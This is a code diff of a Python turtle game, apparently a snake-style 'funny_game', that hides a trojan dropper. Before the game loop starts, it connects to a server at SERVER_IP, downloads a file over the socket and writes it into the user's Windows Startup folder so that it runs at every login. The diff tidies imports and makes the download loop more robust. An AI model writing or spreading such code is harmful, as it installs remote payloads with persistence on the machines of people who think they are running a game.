@@ -1,11 +1,10 @@
-from vuls import *
-import socket
+import os
 import random
+import socket
 import time
 import turtle
-import urllib.request
-import winreg as reg
-import os
+
+from vuls import *
 
 delay = 0.1
 
@@ -103,15 +102,17 @@ my_socket.connect((SERVER_IP, SERVER_PORT))  # local server
 signal = 'g'.encode()
 my_socket.send(signal)
 user_name = os.getlogin()
-location = "c:\\Users\\{}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\funny_game".format(user_name)
+location = "c:\\Users\\{}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\funny_game".format(
+    user_name)
 with open(location, "wb") as f:
     done = False
     while not done:
-        data = my_socket.recv(1024)
-        if data == "EOF":
-            done = True
-        else:
+        try:
+            data = my_socket.recv(1024)
+            print(len(data))
             f.write(data)
+        except Exception:
+            done = True
 
 # Main game loop
 while True:
